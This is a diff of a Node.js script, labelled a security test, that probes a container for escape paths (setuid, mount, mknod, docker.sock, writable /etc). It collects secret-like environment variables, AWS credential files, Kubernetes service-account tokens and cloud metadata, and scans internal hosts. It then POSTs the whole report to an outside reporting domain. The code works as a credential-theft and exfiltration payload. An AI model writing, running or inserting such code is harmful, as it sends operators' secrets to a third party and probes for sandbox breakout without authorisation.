@@ -8,13 +8,15 @@ const METADATA_HOST = "169.254.169.254";
 const REPORT_HOST = "idms-reporting.mycrocloud.site";
 const REPORT_PATH = "/api/report";
 
+/* -------------------- Helpers -------------------- */
+
 function request({ protocol = "http:", timeout = 3000, ...options }, body = null) {
   const lib = protocol === "https:" ? https : http;
 
   return new Promise((resolve) => {
     const req = lib.request(options, (res) => {
       let data = "";
-      res.on("data", (chunk) => (data += chunk));
+      res.on("data", (c) => (data += c));
       res.on("end", () =>
         resolve({
           ok: true,
@@ -25,27 +27,91 @@ function request({ protocol = "http:", timeout = 3000, ...options }, body = null
     });
 
     req.on("error", (err) =>
-      resolve({
-        ok: false,
-        error: err.message,
-      })
+      resolve({ ok: false, error: err.message })
     );
 
-    req.setTimeout(timeout, () => {
-      req.destroy(new Error("Request timeout"));
-    });
+    req.setTimeout(timeout, () =>
+      req.destroy(new Error("Request timeout"))
+    );
 
     if (body) req.write(body);
     req.end();
   });
 }
 
-function safeRead(path) {
+function safeExec(cmd) {
   try {
-    return fs.readFileSync(path, "utf8").slice(0, 1000);
+    return execSync(cmd, { stdio: "pipe" }).toString().trim();
+  } catch (e) {
+    return null;
+  }
+}
+
+function safeRead(path, limit = 1000) {
+  try {
+    return fs.readFileSync(path, "utf8").slice(0, limit);
   } catch {
     return null;
   }
+}
+
+function exists(path) {
+  try {
+    fs.accessSync(path);
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+/* -------------------- Security Tests -------------------- */
+
+function getCapabilities() {
+  const status = safeRead("/proc/self/status");
+  return status?.split("\n").find(l => l.startsWith("CapEff")) || null;
+}
+
+function getSeccomp() {
+  const status = safeRead("/proc/self/status");
+  return status?.split("\n").find(l => l.startsWith("Seccomp")) || null;
+}
+
+function testSetuid() {
+  try {
+    safeExec("cp /bin/sh /tmp/testsh");
+    safeExec("chmod u+s /tmp/testsh");
+    const out = safeExec("ls -l /tmp/testsh");
+    return out?.includes("s") || false;
+  } catch {
+    return false;
+  }
+}
+
+function testWritableEtc() {
+  try {
+    fs.writeFileSync("/etc/.audit_test", "test");
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+function checkDangerousDevices() {
+  const devices = ["/dev/mem", "/dev/kmsg", "/dev/sda", "/dev/fuse"];
+  return Object.fromEntries(devices.map(d => [d, exists(d)]));
+}
+
+function checkCgroupLimits() {
+  const files = [
+    "/sys/fs/cgroup/memory.max",
+    "/sys/fs/cgroup/cpu.max",
+    "/sys/fs/cgroup/pids.max"
+  ];
+  return Object.fromEntries(
+    files
+      .filter(exists)
+      .map(f => [f, safeRead(f)])
+  );
 }
 
 async function scanInternalNetwork() {
@@ -57,36 +123,25 @@ async function scanInternalNetwork() {
     "kubernetes.default.svc",
   ];
 
-  const results = {};
-
+  const result = {};
   for (const host of targets) {
-    const res = await request({
-      protocol: "http:",
+    const r = await request({
       host,
       path: "/",
       method: "GET",
-      timeout: 2000,
+      timeout: 2000
     });
-
-    results[host] = res.ok ? res.statusCode : res.error;
+    result[host] = r.ok ? r.statusCode : r.error;
   }
-
-  return results;
+  return result;
 }
 
-function getMountInfo() {
-  try {
-    return fs.readFileSync("/proc/self/mountinfo", "utf8")
-      .split("\n")
-      .slice(0, 50); // giới hạn output
-  } catch {
-    return null;
-  }
-}
+/* -------------------- Main -------------------- */
 
 async function run() {
   const report = {
     timestamp: new Date().toISOString(),
+
     platform: {
       hostname: os.hostname(),
       platform: process.platform,
@@ -94,146 +149,93 @@ async function run() {
       nodeVersion: process.version,
     },
 
-    // ---- Privilege info ----
-    userInfo: {
+    user: {
       uid: process.getuid?.(),
       gid: process.getgid?.(),
+      whoami: safeExec("whoami"),
     },
 
-    shellAccess: null,
+    privilege: {
+      capabilities: getCapabilities(),
+      seccomp: getSeccomp(),
+      setuidWorks: testSetuid(),
+      canMount: !!safeExec("mount -t tmpfs tmpfs /tmp/testmnt"),
+      canMknod: !!safeExec("mknod /tmp/testnull c 1 3"),
+      writableEtc: testWritableEtc(),
+    },
 
-    // ---- Secret exposure ----
-    envLeak: null,
-    awsCredentialsFile: null,
+    containerIsolation: {
+      namespaces: safeExec("ls /proc/self/ns"),
+      proc1Cgroup: safeRead("/proc/1/cgroup"),
+      mountSample: safeRead("/proc/self/mountinfo"),
+      dockerSock: exists("/var/run/docker.sock"),
+      hostRootExists: exists("/host"),
+      rootfsExists: exists("/rootfs"),
+      dangerousDevices: checkDangerousDevices(),
+    },
 
-    // ---- Container breakout ----
-    dockerSockExists: false,
-    proc1Cgroup: null,
+    secretsExposure: {
+      envLeak: Object.fromEntries(
+        Object.entries(process.env)
+          .filter(([k]) =>
+            /(AWS|KEY|SECRET|TOKEN|PASS|DB|DATABASE)/i.test(k)
+          )
+          .slice(0, 20)
+      ),
+      awsCredentialsFile: safeRead("/root/.aws/credentials"),
+      k8sToken: safeRead(
+        "/var/run/secrets/kubernetes.io/serviceaccount/token"
+      ),
+    },
 
-    // ---- Kubernetes ----
-    k8sToken: null,
+    resourceLimits: {
+      cgroup: checkCgroupLimits(),
+      ulimit: safeExec("ulimit -a"),
+      disk: safeExec("df -h"),
+      processes: safeExec("ps aux | wc -l"),
+    },
 
-    // ---- Network ----
-    metadata: null,
-    metadataError: null,
-    internalScan: null,
-    internetAccess: null,
+    network: {
+      metadata: null,
+      metadataError: null,
+      internalScan: null,
+      internetAccess: null,
+    },
 
-    // ---- Reporting ----
     reportPostStatus: null,
   };
 
-  // 1️⃣ Test shell
-  try {
-    report.shellAccess = execSync("whoami").toString().trim();
-  } catch {
-    report.shellAccess = "blocked";
-  }
-
-  // 2️⃣ Check ENV secrets
-  report.envLeak = Object.fromEntries(
-    Object.entries(process.env)
-      .filter(([k]) =>
-        /(AWS|KEY|SECRET|TOKEN|PASS|DB|DATABASE)/i.test(k)
-      )
-      .slice(0, 15)
-  );
-
-  // 3️⃣ File system checks
-  report.awsCredentialsFile = safeRead("/root/.aws/credentials");
-  report.dockerSockExists = fs.existsSync("/var/run/docker.sock");
-  report.proc1Cgroup = safeRead("/proc/1/cgroup");
-  report.k8sToken = safeRead(
-    "/var/run/secrets/kubernetes.io/serviceaccount/token"
-  );
-
-  // 4️⃣ Test IMDS (metadata)
+  /* -------- IMDS Test -------- */
   const tokenRes = await request({
-    protocol: "http:",
     host: METADATA_HOST,
     path: "/latest/api/token",
     method: "PUT",
-    headers: {
-      "X-aws-ec2-metadata-token-ttl-seconds": "60",
-    },
+    headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" },
   });
 
   if (tokenRes.ok && tokenRes.statusCode === 200) {
     const metaRes = await request({
-      protocol: "http:",
       host: METADATA_HOST,
       path: "/latest/meta-data/",
-      method: "GET",
-      headers: {
-        "X-aws-ec2-metadata-token": tokenRes.body,
-      },
+      headers: { "X-aws-ec2-metadata-token": tokenRes.body },
     });
-
-    report.metadata = metaRes.ok ? metaRes.body : metaRes.error;
+    report.network.metadata = metaRes.ok ? metaRes.body : metaRes.error;
   } else {
-    report.metadataError =
+    report.network.metadataError =
       tokenRes.error || `Status ${tokenRes.statusCode}`;
   }
 
-  // 5️⃣ Internal network scan
-  report.internalScan = await scanInternalNetwork();
+  /* -------- Network Tests -------- */
+  report.network.internalScan = await scanInternalNetwork();
 
-  // 6️⃣ Internet test (allowed for npm install)
-  report.internetAccess = await request({
+  report.network.internetAccess = await request({
     protocol: "https:",
     host: "registry.npmjs.org",
     path: "/",
     method: "GET",
   });
 
-  report.mountInfo = getMountInfo();
-  report.sensitivePaths = {
-    hostRootExists: fs.existsSync("/host"),
-    rootfsExists: fs.existsSync("/rootfs"),
-    dockerSock: fs.existsSync("/var/run/docker.sock"),
-  };
-
-  function getCapabilities() {
-    try {
-      const status = fs.readFileSync("/proc/self/status", "utf8");
-      const capLine = status.split("\n").find(l => l.startsWith("CapEff"));
-      return capLine || null;
-    } catch {
-      return null;
-    }
-  }
-
-  report.capabilities = getCapabilities();
-
-  function getNamespaceInfo() {
-    try {
-      return fs.readdirSync("/proc/self/ns");
-    } catch {
-      return null;
-    }
-  }
-
-  report.namespaces = getNamespaceInfo();
-
-  try {
-    execSync("mkdir -p /tmp/testmount && mount -t tmpfs tmpfs /tmp/testmount");
-    report.canMount = true;
-  } catch {
-    report.canMount = false;
-  }
-
-  try {
-    execSync("mknod /tmp/testnull c 1 3");
-    report.canMknod = true;
-  } catch {
-    report.canMknod = false;
-  }
-
-  report.seccomp = safeRead("/proc/self/status")
-    ?.split("\n")
-    .find(l => l.startsWith("Seccomp"));
-
-  // 7️⃣ Always POST report (even if everything failed)
+  /* -------- Reporting -------- */
   try {
     const postRes = await request(
       {
@@ -241,16 +243,15 @@ async function run() {
         host: REPORT_HOST,
         path: REPORT_PATH,
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
       },
       JSON.stringify(report)
     );
 
-    report.reportPostStatus = postRes.statusCode || postRes.error;
-  } catch (err) {
-    report.reportPostStatus = err.message;
+    report.reportPostStatus =
+      postRes.statusCode || postRes.error;
+  } catch (e) {
+    report.reportPostStatus = e.message;
   }
 
   console.log("==== SECURITY TEST RESULT ====");
